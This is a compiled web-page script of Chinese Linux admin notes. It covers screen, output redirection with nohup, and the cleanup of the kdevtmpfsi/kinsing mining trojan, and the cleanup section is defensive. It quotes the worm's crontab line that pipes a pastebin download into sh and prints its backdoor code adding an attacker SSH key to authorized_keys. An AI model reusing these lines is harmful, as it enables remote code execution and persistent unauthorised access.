"),a("ol",[a("li",[s._v("执行"),a("code",[s._v("screen")]),s._v("即可打开一个session，或者加上参数"),a("code",[s._v("-s")]),s._v("设置一个session的名称（推荐):")])]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("screen")]),s._v("\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("screen")]),s._v(" -S yourname -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" 新建一个叫yourname的session\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("screen")]),s._v(" -ls         -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" 列出当前所有的session\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("screen")]),s._v(" -r yourname -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" 回到切换yourname这个session\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("screen")]),s._v(" -d yourname -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" 远程detach某个session\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("screen")]),s._v(" -d -r yourname -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" 结束当前session并回到yourname这个session\n\n")])])]),a("ul",[a("li",[s._v("快捷键")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("CTRL - a+d ->("),a("strong",[s._v("常用退出切换到后台运行")]),s._v(") detach命令，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。")])]),s._v(" "),a("li",[a("p",[a("s",[s._v("CTRL- a+z -> 把当前session放到后台执行，用 shell 的 fg 命令则可回去，基本没有用到")]),s._v("。")])]),s._v(" "),a("li",[a("p",[a("code",[s._v("screen -X -S 28835 quit")]),s._v("-> 删除对应的session，其中的"),a("code",[s._v("28835")]),s._v("是通过命令"),a("code",[s._v("screen -ls")]),s._v("查看到的对应session的id。")])])]),s._v(" "),a("h2",{attrs:{id:"shell脚本中-dev-null-2-1"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#shell脚本中-dev-null-2-1"}},[s._v("#")]),s._v(" shell脚本中>/dev/null 2>&1")]),s._v(" "),a("p",[s._v("参考文档： https://www.cnblogs.com/youjianjiangnan/p/11561805.html")]),s._v(" "),a("p",[a("code",[s._v(">/dev/null")]),s._v(" 这条命令的作用是将标准输出1重定向到/dev/null中。 /dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了>/dev/null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。\n"),a("code",[s._v("2>&1")]),s._v(" 这条命令用到了重定向绑定，采用&可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，"),a("strong",[s._v("说人话就是错误输出将会和标准输出输出到同一个地方")]),s._v("。")]),s._v(" "),a("p",[s._v("linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以>/dev/null 2>&1的作用就是让"),a("strong",[s._v("标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中")]),s._v("。")]),s._v(" "),a("h3",{attrs:{id:"nohup结合"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#nohup结合"}},[s._v("#")]),s._v(" nohup结合")]),s._v(" "),a("p",[s._v("我们经常使用nohup command &命令形式来启动一些后台程序，比如一些java服务：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# nohup java -jar xxxx.jar &\n")])])]),a("p",[s._v("为了不让一些执行信息输出到前台（控制台），我们还会加上刚才提到的>/dev/null 2>&1命令来丢弃所有的输出：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# nohup java -jar xxxx.jar >/dev/null 2>&1 &\n")])])]),a("p",[s._v("总而言之，在工作中用到最多的就是"),a("code",[s._v("nohup command >/dev/null 2>&1 &")]),s._v("命令")]),s._v(" "),a("h2",{attrs:{id:"挖矿木马病毒清理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#挖矿木马病毒清理"}},[s._v("#")]),s._v(" 挖矿木马病毒清理")]),s._v(" "),a("p",[s._v("问题： 无意在使用"),a("code",[s._v("top")]),s._v("命令的时候发现一个异常进程: "),a("code",[s._v("kdevtmpfsi")]),s._v(",使用"),a("code",[s._v("ps -aux | grep kdevtmpfsi")]),s._v(",发现对应的执行文件路径是: "),a("code",[s._v("/tmp/kdevtmpfsi")]),s._v(". 然后尝试"),a("code",[s._v("kill -9")]),s._v("杀死进程后，再"),a("code",[s._v("rm -rf /tmp/kdevtmpfsi")]),s._v("还是会死而复生。")]),s._v(" "),a("h3",{attrs:{id:"木马解析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#木马解析"}},[s._v("#")]),s._v(" 木马解析")]),s._v(" "),a("ol",[a("li",[s._v("木马解析： https://xz.aliyun.com/t/4386, https://my.oschina.net/u/4437985/blog/3168526 (推荐)")])]),s._v(" "),a("p",[s._v("一般在定时任务（"),a("code",[s._v("crontab -l")]),s._v("）中存在异常脚本:")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("[root@mdw ~]# crontab -l\n*/15 * * * * （curl -fsSL https://pastebin.com/raw/xmxHzu5P||wget -q -O- https://pastebin.com/raw/xmxHzu5P)|sh\n")])])]),a("p",[s._v("1). 攻击者通过网络进入第一台被感染的机器(redis未认证漏洞、ssh密码泄露登录等)。\n2). 第一台感染的机器会读取known_hosts文件，遍历ssh登录，如果是做了免密登录认证，则将直接进行横向传播。\n3). 修改/etc/cron.d/root文件，增加定时任务\n4). kill掉同类挖矿进程\n5). kill掉高好资源的其他进程\n6). 下载执行主恶意程序kerberods\n7). 拉起khugepageds挖矿进程\n8). 为文件添加chattr锁定\n9). 修改IPTABLES\n10). 清除日志\n11). 关闭SELinux\n12). 还有个后门，创建/root/.ssh/authorized_keys，添加病毒作者自己的公钥，保证其可以使用SSH登录到服务器，具体代码如下")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('chmod 700 /root/.ssh/\necho >> /root/.ssh/authorized_keys\nchmod 600 root/.ssh/authorized_keys\necho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" >> /root/.ssh/authorized_keys\n\n\n')])])]),a("h3",{attrs:{id:"木马分析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#木马分析"}},[s._v("#")]),s._v(" 木马分析")]),s._v(" "),a("ol",[a("li",[s._v("继续查看对应的定时任务目录"),a("code",[s._v("nano /etc/crontab")]),s._v(",发现没有对应的病毒形式的定时任务。继续查看用户目录下的定时任务: "),a("code",[s._v("/var/spool/cron/")]),s._v("也没有发现非法的定时任务。")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ nano /var/spool/cron/crontabs/root\n\n$ nano /var/spool/cron/root\n\n$ nano /etc/cron.d/root\n\n")])])]),a("ol",{attrs:{start:"2"}},[a("li",[a("p",[s._v("这个线程重复启动的原因是"),a("strong",[s._v("它还有一个守护线程在运行")]),s._v("，检测到这个线程挂掉的时候就去重新启动，从而导致我们周而复始的出现这个问题。PS： 通过 "),a("code",[s._v("ps -ef")]),s._v(" 命令查出 "),a("code",[s._v("kdevtmpfsi")]),s._v(" 进程号，直接 kill -9 进程号并删除 /tmp/kdevtmpfsi 执行文件。但没有过1分钟进程又运行了，这时就能想到，kdevtmpfsi 有守护程序或者有计划任务。通过 crontab -l 查看是否有可疑的计划任务。")])]),s._v(" "),a("li",[a("p",[s._v("找到线程和守护线程\n根据上面结果知道 kdevtmpfsi 进程号是 10393，使用 "),a("code",[s._v("systemctl status 10393")]),s._v(" 发现 "),a("code",[s._v("kdevtmpfsi")]),s._v(" 有守护进程\nkill 掉 kdevtmpfsi 守护进程 kill -9 30903 30904，再 killall -9 kdevtmpfsi 挖矿病毒，最后删除 kdevtmpfsi 执行程序 rm -f /tmp/kdevtmpfsi")])])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ pstree -a\n$ netstat -natp\n")])])]),a("p",[s._v("这时候我们就可以找到kdevtmpfsi线程 和它的守护线程"),a("code",[s._v("kinsing")]),s._v(".直接kill线程和它的守护线程:")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('$ ps -aux | grep curl\n$ ps -aux|grep kinsing\n$ ps -aux|grep kdevtmpfsi\n\n\n$ kill -9 19128\n$ kill -9 3722\n$ rm -rf /tmp/kdevtmpfsi\n$ rm -rf /var/tmp/kinsing\n$ find / -name "kinsing*" | xargs rm -rf\n$ find / -name kdevtmpfsi | xargs rm -rf\n$ rm -f /root/.ssh/authorized_keys\n')])])]),a("ol",{attrs:{start:"4"}},[a("li",[s._v("查找可疑定时任务")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# 首先停止cron服务，避免因其不断执行而导致恶意文件反复下载执行。如果操作系统可以使用service命令\nsystemctl stop cron\ncrontab -l 查看定时任务\ncrontab -r 表示删除用户的定时任务，当执行此命令后，所有用户下面的定时任务会被删除\n")])])]),a("p",[a("img",{attrs:{src:"https://img-blog.csdnimg.cn/20191227100428997.png",alt:"https://img-blog.csdnimg.cn/20191227100428997.png"}})]),s._v(" "),a("p",[s._v("删除可以定时任务"),a("code",[s._v("crontab -e")]),s._v(",编辑删除定时任务即可。")]),s._v(" "),a("ol",{attrs:{start:"5"}},[a("li",[s._v("安全加固")])]),s._v(" "),a("p",[s._v("5.1. SSH\n① 谨慎做免密登录\n② 不使用默认的22端口\n③ 禁止root登录")]),s._v(" "),a("p",[s._v("5.2. Redis\n① 增加授权认证(requirepass参数)\n② 尽量使用docker版本(docker pull redis)\n③ 隐藏重要的命令")]),s._v(" "),a("p",[s._v("5.3 使用busybox删除")]),s._v(" "),a("p",[s._v("5.4 屏蔽"),a("code",[s._v("pastebin.com")]),s._v("、thrysi.com等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的")]),s._v(" "),a("p",[s._v("5.6 "),a("code",[s._v("netstat -natp")]),s._v(" 命令查看是否有异常陌生IP的TCP连接，查询到有来自国外的陌生IP，做了白名单处理")]),s._v(" "),a("p",[s._v("5.7 启用ssh公钥登陆，禁用密码登陆。\n5.8 云主机：完善安全策略，入口流量，一般只开放 80 443 端口就行，出口流量默认可以不限制，如果有需要根据需求来限制。物理机：可以通过硬件防火墙或者机器上iptables 来开放出入口流量规则。\n5.9 本机不是直接需要对外提供服务，可以拒绝外网卡入口所有流量，通过 jumper 机器内网登陆业务机器。")]),s._v(" "),a("h3",{attrs:{id:"常见非法的木马病毒"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#常见非法的木马病毒"}},[s._v("#")]),s._v(" 常见非法的木马病毒")]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("挖矿病毒")]),s._v(" "),a("th",[s._v("正常文件")]),s._v(" "),a("th",[s._v("关联文件")]),s._v(" "),a("th",[s._v("原因")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("kdevtmpfsi")]),s._v(" "),a("td",[s._v("kdevtmpfs")]),s._v(" "),a("td",[s._v("kinsing")]),s._v(" "),a("td",[s._v("最根本的原因是自己的redis 6379配置不当导致的。大家可以参考阿里云的Redis服务安全加固")])]),s._v(" "),a("tr",[a("td",[s._v("Watchdogs")]),s._v(" "),a("td",[s._v("Watchdog")]),s._v(" "),a("td"),s._v(" "),a("td")]),s._v(" "),a("tr",[a("td",[s._v("trace")]),s._v(" "),a("td",[s._v("trace")]),s._v(" "),a("td"),s._v(" "),a("td")])])])],1)}),[],!1,null,null,null);t.default=n.exports}}]);